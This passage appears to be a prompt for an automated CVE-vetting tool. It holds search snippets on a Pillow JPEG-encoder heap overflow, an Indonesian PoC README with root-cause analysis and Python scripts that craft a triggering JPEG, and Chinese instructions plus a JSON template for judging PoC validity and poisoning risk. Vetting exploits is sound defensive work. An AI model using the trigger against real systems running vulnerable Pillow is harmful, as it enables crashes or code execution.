 created by untrusted sources are at risk.\n [link] https://app.opencve.io/cve/CVE-2026-96778\n [webpage 0 end]\n[webpage 1 begin] [title] GitHub - 0xMarcio/pocindex: Search public CVE proof-of ...\n [description] 1 day ago · PoC Index: Search public CVE proof-of-concept exploits from GitHub, Nuclei, ExploitDB, Metasploit and Vulhub, with CVSS, EPSS and CISA KEV context. Find exploits by CVE, vendor, product or keyword. Compare CVSS severity, EPSS exploitation scores and CISA known-exploited status.\n [link] https://github.com/0xMarcio/pocindex\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-96778 - Pillow: Heap buffer overflow writing JPEG ...\n [description] Oct 21, 2026 · Solution Update Pillow to version 13.0.0 or later to fix a heap memory corruption vulnerability. Update the Pillow library to version 13.0.0 or newer. Avoid processing untrusted JPEG images with older versions. We scan GitHub repositories to detect new proof-of-concept exploits.\n [link] https://cvefeed.io/vuln/detail/CVE-2026-96778\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-96778: Pillow Out-of-bounds Write - CVETodo\n [description] 6 days ago · CVE-2026-96778 is a CVSS 7.7 Out-of-bounds Write vulnerability in Pillow. Includes technical details, affected versions, and mitigation steps.\n [link] https://cvetodo.com/cve/CVE-2026-96778\n [webpage 3 end]\n[webpage 4 begin] [title] Red Hat: CVE-2026-96778: pillow: pillow: Arbitrary code ...\n [description] 6 days ago · Red Hat: CVE-2026-96778: pillow: pillow: Arbitrary code execution via JPEG encoder buffer overflow. View severity, references, and remediation details from Rapid7.\n [link] https://www.rapid7.com/db/vulnerabilities/cve-2026-96778/\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/4dd842ce919ca9c624af53054089ef83/README.md\n---\n# CVE-2026-96778 — Heap Buffer Overflow in Pillow JPEG Encoder\n\n![Status](https://img.shields.io/badge/status-verified-red)\n![Pillow](https://img.shields.io/badge/Pillow-9.4.0%20%E2%80%93%20%3C13.0.0-red)\n![Fixed](https://img.shields.io/badge/fixed-13.0.0-green)\n![Platform](https://img.shields.io/badge/platform-linux%20x86__64-lightgrey)\n\nRepositori ini berisi **Proof of Concept (PoC)**, bukti reproduksi, dan analisis\nteknis untuk **CVE-2026-96778**, sebuah *heap buffer overflow* pada pustaka\n[Pillow](https://python-pillow.org/) (Python Imaging Library).\n\n> **Ringkasan singkat**: Menyimpan ulang gambar JPEG yang membawa profil ICC\n> berukuran tepat dan komentar (COM marker) menyebabkan penulisan melewati\n> buffer encoder 65.536 byte, merusak metadata heap, dan berpotensi\n> menyebabkan *denial of service* (crash) hingga eksekusi kode.\n\n---\n\n## 1. Detail Kerentanan\n\n| Field | Nilai |\n|---|---|\n| **CVE ID** | CVE-2026-96778 |\n| **Komponen** | `src/libImaging/JpegEncode.c` — `ImagingJpegEncode()` |\n| **Titik rentan** | Baris 282 (`jpeg_write_marker` untuk COM marker) |\n| **Tipe** | Heap Buffer Overflow (CWE-122) |\n| **Rentang terpengaruh** | Pillow **9.4.0 – <13.0.0** |\n| **Diperbaiki di** | Pillow **13.0.0** |\n| **Dampak** | DoS (SIGSEGV/SIGABRT), potensi RCE |\n| **Vektor** | Lokal / interaksi pengguna (membuka & menyimpan ulang gambar) |\n| **Advisory** | [GHSA-g7cr-3p24-7wf7](https://github.com/python-pillow/Pillow/security/advisories/GHSA-g7cr-3p24-7wf7) |\n\n---\n\n## 2. Analisis Akar Masalah\n\n### 2.1 Alur Kode\n\n1. `JpegImagePlugin._save()` menghitung ukuran buffer output hanya dari\n   `exif` dan `extra` (profil ICC), **tanpa menyisakan ruang untuk komentar**.\n2. `_encode_to_file()` (`src/encode.c:186`) mengalokasikan buffer\n   `MAXBLOCK = 65.536` byte.\n3. Profil ICC sebesar **65.498 byte** mengisi buffer tepat hingga byte terakhir,\n   sehingga `free_in_buffer == 0`.\n4. Saat `jpeg_write_marker()` dipanggil untuk menulis COM marker\n   (`JpegEncode.c:282`), `libjpeg` **menulis 1 byte terlebih dahulu**, baru\n   kemudian mengurangi counter `size_t free_in_buffer`.\n5. Karena counter bernilai 0, pengurangan menyebabkan **underflow** menjadi\n   ~2⁶⁴. Pemeriksaan batas selanjutnya menjadi tidak valid.\n6. Sisa komentar dan data gambar terkompresi **ditulis melewati batas buffer**,\n   menimpa memori heap di sekitarnya.\n\n### 2.2 Perhitungan Ukuran Pemicu\n\n```\nENCODER_BUFFER = 65536          # ImageFile.MAXBLOCK\nJFIF_HEADER    = 20             # SOI + APP0 (ditulis jpeg_start_compress)\nICC_OVERHEAD   = 18             # FFE2 <len> \"ICC_PROFILE\\0\" <seq> <count>\nICC_PAYLOAD    = 65536 - 20 - 18 = 65498   # tepat penuh\n```\n\nDengan `ICC_PAYLOAD = 65498`, buffer terisi tepat sampai byte terakhir.\nMenambahkan COM marker (panjang berapa pun, 1–65533 byte) memicu overflow.\n\n### 2.3 Mengapa Komentar Besar Lebih Efektif\n\nKomentar maksimal legal (`65.533` byte) membuat overflow menulis data dalam\njumlah besar, sehingga crash lebih deterministik. Komentar kecil (mis. 32 byte)\ntetap memicu `Invalid write` di Valgrind, tetapi belum tentu crash di runtime\nnormal (tergantung layout heap dan allocator).\n\n---\n\n## 3. Lingkungan Uji\n\n| Komponen | Nilai |\n|---|---|\n| OS | Ubuntu Linux x86_64 |\n| Kernel | Linux 6.x |\n| Python | 3.12.3 |\n| Valgrind | 3.22.0 |\n| libjpeg | 8.2.2 (`/usr/lib/x86_64-linux-gnu/libjpeg.so.8.2.2`) |\n| Compiler | gcc 13.3.0 |\n| Pillow diuji | 9.4.0, 9.5.0, 13.0.0 |\n| Sumber Pillow | build dari source (`pip install -e .`) |\n\n---\n\n## 4. Proof of Concept\n### 4.1 `make_trigger.py` — Generator JPEG Pemicu\n\nMembuat `trigger.jpg` dengan profil ICC 65.498 byte dan COM marker.\n\n```python\nfrom PIL import Image\nimport io, struct\n\nim = Image.new(\"RGB\", (16, 16), (255, 0, 0))\nbuf = io.BytesIO()\nim.save(buf, \"JPEG\", quality=90)\nbase_jpeg = buf.getvalue()\n\nicc_data = b\"\\x00\" * 65498\nicc_header = b\"ICC_PROFILE\\x00\" + bytes([1, 1])\napp2_payload = icc_header + icc_data\n\ndef make_app2(payload):\n    length = len(payload) + 2\n    return b\"\\xFF\\xE2\" + struct.pack(\">H\", length) + payload\n\ndef make_com(comment: bytes):\n    length = len(comment) + 2\n    return b\"\\xFF\\xFE\" + struct.pack(\">H\", length) + comment\n\nassert base_jpeg[:2] == b\"\\xFF\\xD8\"\ntrigger = base_jpeg[:2] + make_app2(app2_payload) + make_com(b\"X\" * 32) + base_jpeg[2:]\n\nwith open(\"trigger.jpg\", \"wb\") as f:\n    f.write(trigger)\nprint(\"trigger.jpg dibuat:\", len(trigger), \"byte\")\n```\n\n### 4.2 `repro_cve.py` — Reproduksi Valgrind-Friendly\n\n```python\nfrom PIL import Image\n\nim = Image.open(\"trigger.jpg\")\nprint(\"Ukuran:\", im.size, \"format:\", im.format)\nprint(\"Punya ICC:\", \"icc_profile\" in im.info)\nprint(\"Punya komentar:\", \"comment\" in im.info)\n\nim.save(\"out.jpg\", \"JPEG\", icc_profile=im.info.get(\"icc_profile\"))\nprint(\"Selesai menyimpan ulang.\")\n```\n\nJalankan dengan Valgrind:\n\n```bash\npython3 make_trigger.py\nvalgrind --error-exitcode=1 python3 repro_cve.py 2> valgrind.log\n```\n\n### 4.3 `poc_advisory.py` — PoC Referensi (Crash Detection)\n\nBerd\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
